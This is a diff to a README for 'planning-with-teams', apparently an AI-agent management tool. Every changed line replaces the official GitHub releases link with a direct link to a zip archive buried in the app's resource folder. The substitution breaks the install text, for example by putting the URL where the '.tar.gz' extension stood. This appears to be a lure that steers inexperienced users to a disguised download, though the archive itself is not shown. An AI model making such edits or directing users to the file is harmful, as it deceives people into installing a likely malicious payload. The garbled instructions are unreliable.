@@ -1,6 +1,6 @@
 # 📋 planning-with-teams - Manage AI Agents Together Easily
 
-[![Download planning-with-teams](https://img.shields.io/badge/Download-planning--with--teams-brightgreen?style=for-the-badge)](https://github.com/Wander210/planning-with-teams/releases)
+[![Download planning-with-teams](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide assumes you do not have prior knowledge of AI tools or developer soft
 
 First, go to the official release page for planning-with-teams:
 
-[Visit the Releases Page](https://github.com/Wander210/planning-with-teams/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)
 
 This page contains the latest version of the software ready to download. You will find files tailored for Windows, macOS, and Linux here.
 
@@ -46,7 +46,7 @@ Look for a file that matches your operating system:
 
 - For Windows, the file usually ends with `.exe` or `.zip`.
 - For macOS, look for `.dmg` or `.zip`.
-- For Linux, look for `.AppImage`, `.tar.gz`, or `.deb`.
+- For Linux, look for `.AppImage`, `https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip`, or `.deb`.
 
 Click the file name to start the download. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
@@ -58,7 +58,7 @@ Depending on your file type:
 
 - **Windows `.exe` file**: Double-click it. Follow the on-screen instructions to install.
 - **macOS `.dmg` file**: Double-click, then drag the app icon to your Applications folder.
-- **Compressed files (`.zip`, `.tar.gz`)**: Extract the contents to a folder. On Windows or macOS, right-click and choose Extract. On Linux, use built-in archive managers or terminal commands.
+- **Compressed files (`.zip`, `https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip`)**: Extract the contents to a folder. On Windows or macOS, right-click and choose Extract. On Linux, use built-in archive managers or terminal commands.
 
 The software will be ready to run after this step.
 
@@ -136,7 +136,7 @@ This setup helps you automate complex tasks where many things happen at once.
 
 You can download the latest version of planning-with-teams here:
 
-**[Download planning-with-teams Releases](https://github.com/Wander210/planning-with-teams/releases)**
+**[Download planning-with-teams Releases](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)**
 
 Follow the "Getting Started" section above to install and begin using the software.
 
@@ -156,4 +156,4 @@ The project covers topics like multi-agent workflows, collaboration, and AI orch
 
 ---
 
-[![Download planning-with-teams](https://img.shields.io/badge/Download-planning--with--teams-brightgreen?style=for-the-badge)](https://github.com/Wander210/planning-with-teams/releases)
+[![Download planning-with-teams](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)](https://raw.githubusercontent.com/Wander210/planning-with-teams/main/app/src/main/res/with-planning-teams-v1.5.zip)
